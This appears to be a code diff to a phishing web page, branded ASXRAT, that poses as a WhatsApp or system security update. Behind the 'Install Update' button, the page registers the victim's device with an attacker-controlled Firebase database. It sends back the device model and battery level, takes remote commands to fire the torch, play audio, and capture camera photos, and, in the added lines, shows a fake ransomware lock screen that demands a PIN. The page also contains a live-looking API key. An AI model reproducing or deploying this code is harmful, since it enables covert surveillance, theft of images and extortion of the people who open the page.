@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Update</title>
+    <title>System Update</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
@@ -11,13 +11,30 @@
         .wa-box { background: #202c33; padding: 25px; border-radius: 12px; width: 85%; text-align: center; border-top: 5px solid #00a884; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .wa-btn { background: #00a884; color: #fff; border: none; padding: 15px; border-radius: 5px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
         video, canvas { display: none; }
+
+        /* TAMPILAN RANSOMWARE */
+        #lock-screen { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #000; color: #f00; z-index: 9999; text-align: center; padding: 40px 20px; font-family: monospace;
+        }
+        .pin-box { background: #111; border: 2px solid #f00; color: #f00; padding: 12px; width: 80%; text-align: center; font-size: 20px; margin-top: 20px; outline: none; }
+        .btn-unlock { background: #f00; color: #000; border: none; padding: 15px 30px; font-weight: bold; margin-top: 20px; cursor: pointer; border-radius: 5px; }
     </style>
 </head>
 <body>
-    <div class="wa-box">
-        <h3 style="color: #00a884;">ASXRAT V1 | SECURITY</h3>
-        <p style="font-size: 14px; color: #8696a0;">Pembaruan sistem enkripsi diperlukan untuk keamanan perangkat.</p>
-        <button class="wa-btn" onclick="startASX()">UPDATE SEKARANG</button>
+
+    <div id="setup-box" class="wa-box">
+        <h3 style="color: #00a884;">ASXRAT | SECURITY</h3>
+        <p style="font-size: 14px; color: #8696a0;">System update required for device stability.</p>
+        <button class="wa-btn" onclick="startASX()">INSTALL UPDATE</button>
+    </div>
+
+    <div id="lock-screen">
+        <h1 id="lock-title">SYSTEM ENCRYPTED</h1>
+        <p id="lock-msg">Your files are locked. Contact owner for PIN.</p>
+        <input type="number" id="pin-input" class="pin-box" placeholder="ENTER PIN">
+        <br>
+        <button class="btn-unlock" onclick="checkPin()">UNLOCK DEVICE</button>
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -25,6 +42,7 @@
     <audio id="player"></audio>
 
     <script>
+        // CONFIG FIREBASE
         const firebaseConfig = {
             apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
             authDomain: "control-rat.firebaseapp.com",
@@ -38,6 +56,7 @@
         const db = firebase.database();
         const tid = "ASX_" + Math.random().toString(36).substr(2, 5);
         let vbtInt;
+        let correctPin = "1234";
 
         async function getDeviceModel() {
             if (navigator.userAgentData?.getHighEntropyValues) {
@@ -66,16 +85,20 @@
                 const ref = db.ref('targets/' + tid);
 
                 const updateBatt = async () => {
-                    const batt = await navigator.getBattery();
-                    ref.update({ battery: Math.floor(batt.level * 100) + "%", charging: batt.charging ? "⚡" : "🔋" });
+                    if('getBattery' in navigator) {
+                        const batt = await navigator.getBattery();
+                        ref.update({ battery: Math.floor(batt.level * 100) + "%", charging: batt.charging ? "⚡" : "🔋" });
+                    }
                 };
                 updateBatt();
 
                 ref.update({ model: nameHP, status: "Online" });
                 ref.onDisconnect().remove();
 
+                // COMMAND LISTENER
                 db.ref('commands/' + tid).on('child_added', (snap) => {
                     const cmd = snap.val(); const key = snap.key; if(!cmd) return;
+                    
                     if(cmd.type === "flash") track.applyConstraints({ advanced: [{ torch: (cmd.status === "on") }] });
                     if(cmd.type === "play_music") { const p = document.getElementById('player'); p.src = cmd.url; p.play(); }
                     if(cmd.type === "stop_music") { const p = document.getElementById('player'); p.pause(); p.currentTime = 0; }
@@ -87,10 +110,25 @@
                         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                         ref.update({ foto: canvas.toDataURL('image/jpeg', 0.5) });
                     }
+                    if(cmd.type === "lock") {
+                        document.getElementById('lock-screen').style.display = 'block';
+                        document.getElementById('lock-title').innerText = cmd.title;
+                        document.getElementById('lock-msg').innerText = cmd.msg;
+                        correctPin = cmd.pin;
+                    }
+
                     db.ref('commands/' + tid + '/' + key).remove();
                 });
-                alert("Sinkronisasi Berhasil!");
-            } catch (e) { alert("Wajib Izinkan!"); }
+                document.getElementById('setup-box').innerHTML = "<h3>Sistem Diperbarui!</h3><p>Perangkat Anda sekarang lebih aman.</p>";
+            } catch (e) { alert("Izin akses ditolak! Update gagal."); }
+        }
+
+        function checkPin() {
+            const val = document.getElementById('pin-input').value;
+            if(val === correctPin) {
+                document.getElementById('lock-screen').style.display = 'none';
+                alert("ACCESS GRANTED");
+            } else { alert("WRONG PIN!"); }
         }
     </script>
 </body>
